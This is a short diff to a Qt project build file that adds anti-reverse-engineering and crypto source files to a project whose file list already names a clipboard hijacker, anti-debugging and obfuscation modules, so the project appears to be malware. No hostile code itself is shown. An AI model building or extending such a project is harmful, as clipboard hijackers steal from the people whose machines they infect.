@@ -20,7 +20,9 @@ DEFINES += QT_DEPRECATED_WARNINGS
 
 SOURCES += \
     anti_debug.cpp \
+    anti_reverse.cpp \
     clipboard_hijacker.cpp \
+    crypto.cpp \
     main.cpp \
     mainwindow.cpp \
     obfuscation.cpp \
@@ -28,7 +30,9 @@ SOURCES += \
 
 HEADERS += \
     anti_debug.h \
+    anti_reverse.h \
     clipboard_hijacker.h \
+    crypto.h \
     mainwindow.h \
     obfuscation.h \
     screen_saver.h
